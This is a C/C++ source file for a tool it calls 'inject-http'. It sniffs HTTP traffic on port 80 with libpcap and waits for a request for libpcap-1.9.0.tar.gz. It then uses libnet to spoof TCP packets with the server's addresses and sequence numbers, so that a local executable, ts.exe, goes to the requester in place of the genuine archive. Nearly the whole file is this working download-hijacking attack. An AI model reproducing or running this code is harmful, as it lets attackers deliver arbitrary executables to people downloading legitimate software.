#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <libnet.h>
#include <pcap.h> 
#include <time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <pthread.h>
#include <semaphore.h>

#include "CObjFile.h"
#include <set>
#include<iostream>
using namespace std;

pthread_t g_libnet_thread, g_libnet_thread_keep;
//const char* g_sendNetCard = "eth1";
//const char* g_recvNetCard = "eth1";

const char* g_sendNetCard = "enx000ec6c02795";
const char* g_recvNetCard = "enp3s0";
const char* g_server_file = "./ts.exe";

sem_t sem_file,sem_keepalive;//信号量

uint8_t g_send_payload[4096*10] = { 0x00 };
int g_payload_s = 4096*10;

u_int fseq = 0;
u_int seqno, ackno;
u_short dp, sp;
unsigned int src_ip;
unsigned int dst_ip;//目的ip
uint8_t  * src_mac = NULL;
uint8_t  * dst_mac = NULL;
uint16_t new_win = 65536;

//要等待的ack,seq
u_int wait_ack, wait_seq;
u_int keepalive_seq;
//更新处理过的ackno
set<u_int> g_set_ackno;

void restall()
{
	fseq = 0;
	seqno = 0;
	ackno = 0;
	dp = 0;
	sp = 0;
	src_ip = 0;
	dst_ip = 0;
	new_win = 65536;
	src_mac = NULL;
	dst_mac = NULL;
	keepalive_seq = 0;
}


bool send_push_ack_file(libnet_t *lib_net, u_int useq, u_int uack, const char* buffer, int buf_size)
{
	bool bret = false;
	if (buf_size <= 0)
	{
		return bret;
	}

	libnet_ptag_t tcp_tag = libnet_build_tcp(
		sp,
		dp,
		useq,
		uack,
		TH_PUSH | TH_ACK,
		14600,
		0,
		0,
		LIBNET_TCP_H + buf_size,
		(const uint8_t*)buffer,
		buf_size,
		lib_net,
		0);

	if (-1 == tcp_tag)
	{
		bret = false;
		printf("tcp_tag error!\n");
	}
	libnet_ptag_t ip_tag = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_TCP_H + buf_size,
		0,
		(u_short)libnet_get_prand(LIBNET_PRu16),
		0,
		libnet_get_prand(LIBNET_PR8),
		IPPROTO_TCP,//pro
		0,
		src_ip,
		dst_ip,
		NULL,
		0,
		lib_net,
		0
	);

	if (-1 == ip_tag)
	{
		bret = false;
		printf("ip_tag error!\n");
	}


	libnet_ptag_t lib_t = libnet_build_ethernet((uint8_t *)dst_mac, (uint8_t *)src_mac, ETHERTYPE_IP, NULL, 0, lib_net, 0);

	if (-1 == lib_t)
	{
		bret = false;
		printf("lib_t error!\n");
	}

	int page_size = libnet_write(lib_net);
	if (page_size < 0)
	{
		bret = false;
		printf("error send send_push_ack_file %d size.\n", page_size);
	}
	else
	{ 
		//printf("send send_push_ack_file %d size.\n", page_size);
		bret = true;
	}
		


	return bret;
}

void send_fin_ack_file(libnet_t *lib_net, u_int useq, u_int uack)
{
	libnet_ptag_t tcp_tag = libnet_build_tcp(
		sp,
		dp,
		useq,
		uack,
		TH_FIN | TH_ACK,
		14600,
		0,
		0,
		LIBNET_TCP_H,
		NULL,
		0,
		lib_net,
		0);

	if (-1 == tcp_tag)
	{
		printf("tcp_tag error!\n");
	}
	libnet_ptag_t ip_tag = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_TCP_H,
		0,
		(u_short)libnet_get_prand(LIBNET_PRu16),
		0,
		libnet_get_prand(LIBNET_PR8),
		IPPROTO_TCP,//pro
		0,
		src_ip,
		dst_ip,
		NULL,
		0,
		lib_net,
		0
	);

	if (-1 == ip_tag)
	{
		printf("ip_tag error!\n");
	}

	libnet_ptag_t lib_t = libnet_build_ethernet((uint8_t *)dst_mac, (uint8_t *)src_mac, ETHERTYPE_IP, NULL, 0, lib_net, 0);

	if (-1 == lib_t)
	{
		printf("lib_t error!\n");
	}

	int page_size = libnet_write(lib_net);
	if (page_size < 0)
	{
		printf("error send send_fin_ack_file %d size.\n", page_size);
	}
	else
		printf("send send_fin_ack_file %d size.\n", page_size);


}

void* libnet_sendfile(void *arg)
{
	CObjFile* pReplaceFile = new CObjFile(g_server_file);
	if (pReplaceFile)
	{
		pReplaceFile->load();
	}

	char err_buf_libnet[100] = { 0 };
	libnet_t *lib_net_file = libnet_init(LIBNET_LINK, g_sendNetCard, err_buf_libnet);

	if (NULL == lib_net_file)
	{
		printf("lib_net_ack init error:%s\n", err_buf_libnet);
		return NULL;
	}

	while (1)
	{
		libnet_clear_packet(lib_net_file);

		sem_wait(&sem_file);

/*
			printf("===============================================================================\n");
			printf("start_seq:%ld(%ld)\n", seqno,seqno-fseq);
			printf("start_ack:%ld\n", ackno);
			printf("win:%ld\n",new_win);
*/

		if ((seqno == 0) && (ackno == 0) && (fseq == 0) && (new_win == 0))
		{
			//printf("init state\n");
		}
		else
		{

			pReplaceFile->before_update_seq_ack(seqno, ackno, fseq);
			if (pReplaceFile->get_ok_send() <= 0)
			{
				printf("will send file,file size is %ld bytes\n", pReplaceFile->get_buf_size());
				pReplaceFile->rest();
				pReplaceFile->before_update_seq_ack(seqno, ackno, fseq);
			}

			//printf("will send file,file size is %llX bytes\n", (long long)(pReplaceFile->getbuf()));

			//printf("s:%llx", pReplaceFile->get_ok_send());
			for( int i = 0 ; i < 10 ; i++ )
			{
				if( send_push_ack_file(lib_net_file, pReplaceFile->get_send_no().seq, pReplaceFile->get_send_no().ack, pReplaceFile->get_need_send_buf(), pReplaceFile->get_need_send_size()) )
				{
					libnet_clear_packet(lib_net_file);
					pReplaceFile->update_oksend_seq();
				}

			}

			//printf("e:%llx", pReplaceFile->get_ok_send());

			st_sig_no wait_no = pReplaceFile->get_wait_no();
			wait_seq = wait_no.seq;
			wait_ack = wait_no.ack;
			/*
			printf("wait_seq:%ld\n", wait_seq);
			printf("wait_ack:%ld\n", wait_ack);
			printf("ok_send:%ld\n", pReplaceFile->get_ok_send());
			*/

			if (pReplaceFile->isSendOver())
			{
				printf("file send ok , size is ok_send:%ld bytes\n", pReplaceFile->get_ok_send());
				restall();
			}
	
		}
	}
	pReplaceFile->Release();
	pReplaceFile = NULL;
}

void pre_build(struct libnet_ethernet_hdr* ethheader, struct libnet_ipv4_hdr* ipptr, struct libnet_tcp_hdr* tcpheader,int size_payload)
{
	seqno = ntohl(tcpheader->th_ack);
	ackno = ntohl(tcpheader->th_seq) + size_payload;
	dp = ntohs(tcpheader->th_sport);
	sp = ntohs(tcpheader->th_dport);
	src_ip = ipptr->ip_dst.s_addr;
	dst_ip = ipptr->ip_src.s_addr;

	src_mac = ethheader->ether_dhost;
	dst_mac = ethheader->ether_shost;
}

bool check_is_tcp_window_full(struct libnet_ethernet_hdr* ethheader, struct libnet_ipv4_hdr* ipptr, struct libnet_tcp_hdr* tcpheader ,int size_payload)
{
	bool bret = false;
	new_win = ntohs(tcpheader->th_win);
	if (new_win <= 0)
	{
		//printf("p\n");
		pre_build(ethheader, ipptr, tcpheader, size_payload);
		//seqno = ntohl(tcpheader->th_ack) - 1;
		ackno = ntohl(tcpheader->th_seq);
		keepalive_seq = ntohl(tcpheader->th_ack) - 1;
		bret = true;
	}

	return bret;
}

void tcp_callback(u_char *arg, const struct pcap_pkthdr *pcap_pkt, const u_char *packet)
{
	struct libnet_ethernet_hdr *ethheader = (struct libnet_ethernet_hdr*)(packet);
	struct libnet_ipv4_hdr* ipptr = (struct libnet_ipv4_hdr*)(packet + LIBNET_ETH_H);
	int size_ip = ipptr->ip_hl * 4;//IP_HL(ipptr) * 4;
	struct libnet_tcp_hdr *tcpheader = (struct libnet_tcp_hdr *)(packet + LIBNET_ETH_H + size_ip);
	int size_tcp = tcpheader->th_off * 4;    //TH_OFF(tcpheader) * 4;

	const u_char * payload = (u_char *)(packet + LIBNET_ETH_H + size_ip + size_tcp);
	int size_payload = ntohs(ipptr->ip_len) - (size_ip + size_tcp);

	const char* szFindFileKey = "GET /release/libpcap-1.9.0.tar.gz HTTP/";
	int szFindFileKey_len = strlen(szFindFileKey);

	//url匹配
	if (szFindFileKey_len <= size_payload)
	{
		if (0 == strncmp((const char *)payload, (const char *)szFindFileKey, szFindFileKey_len))
		{
			pre_build(ethheader, ipptr, tcpheader, size_payload);
			fseq = seqno;
			int value;
			sem_getvalue(&sem_file,&value);
			printf("hook:%d\n",value);
			sem_post(&sem_file);
		}
	}
	else
	{

		//回包处理
		if ((ntohl(tcpheader->th_seq) == wait_seq) && (ntohl(tcpheader->th_ack) == wait_ack))
		{
			u_int ack_v = ntohl(tcpheader->th_ack);
			int b_size = g_set_ackno.size();
			g_set_ackno.insert(ack_v);
			if (b_size != g_set_ackno.size())
			{
				//添加成功
				pre_build(ethheader, ipptr, tcpheader, size_payload);
				if (check_is_tcp_window_full(ethheader, ipptr, tcpheader, size_payload))
				{
					//发送keepalive
					sem_post(&sem_file);
				}
				else
				{
					//发送正常包
					sem_post(&sem_file);
				}
			}
		}
		else
		{
			//处理windos is pull的情况
			if ((ntohl(tcpheader->th_seq) == wait_seq))
			{
				if (check_is_tcp_window_full(ethheader, ipptr, tcpheader, size_payload))
				{
					//发送keepalive
					sem_post(&sem_file);
				}
					
			}
	
		}
	}
}

void pcap_callback(unsigned char *arg, const struct pcap_pkthdr *pcap_pkt, const unsigned char *packet)
{

	struct libnet_ethernet_hdr *ethheader = (struct libnet_ethernet_hdr*)packet;
	u_short protocol = ntohs(ethheader->ether_type);
	if (0x0800 == protocol)
	{
		struct libnet_ipv4_hdr* ipptr = (struct libnet_ipv4_hdr*)(packet + LIBNET_ETH_H);//得到ip包头
		if (6 == ipptr->ip_p)
			tcp_callback(arg, pcap_pkt, packet);
	}

}


static int proc_detect(const char *procname)
{
	char filename[100] = { 0 };
	sprintf(filename, "%s/%s.pid", "./", procname);
	
	int fd = open(filename, O_RDWR | O_CREAT, (S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH));
	if (fd < 0) {
		printf("open file \"%s\" failed!!!\n", filename);
		return 1;
	}

	struct flock fl;
	fl.l_type = F_WRLCK;
	fl.l_start = 0;
	fl.l_whence = SEEK_SET;
	fl.l_len = 0;

	int ret = fcntl(fd, F_SETLK, &fl);
	if (-1 == ret) {
		printf("file \"%s\" locked. proc already exit!!!\n", filename);
		close(fd);
		return 1;
	}
	else {
		ftruncate(fd, 0);
		char buf[16];
		sprintf(buf, "%ld", (long)getpid());
		write(fd, buf, strlen(buf) + 1);
		//do not close file
		return 0;
	}
}

int main()
{
	if (1 == proc_detect("inhttpfile"))
		return 0;

	printf("hello from inject-http!\n");
	printf("recv_card:%s\n", g_recvNetCard);
	printf("send_card:%s\n", g_sendNetCard);

	sem_init(&sem_file, 0, 0);
	sem_init(&sem_keepalive, 0, 0);
	
	pthread_create(&g_libnet_thread, NULL, libnet_sendfile, NULL);
	//pthread_create(&g_libnet_thread_keep, NULL, libnet_send_keep_alive, NULL);

	

	char err_buf[100] = { 0 };
	pcap_t * pcap_handle = pcap_open_live(g_recvNetCard, 65536, 1, 0, err_buf);

	struct bpf_program filter;
	pcap_compile(pcap_handle, &filter, "tcp dst port 80", 1, 0);
	pcap_setfilter(pcap_handle, &filter);


	while (1)
	{
		pcap_loop(pcap_handle, 1, pcap_callback, NULL);
	}

	sem_destroy(&sem_file);
	sem_destroy(&sem_keepalive);
	pcap_close(pcap_handle);

	return 0;
}
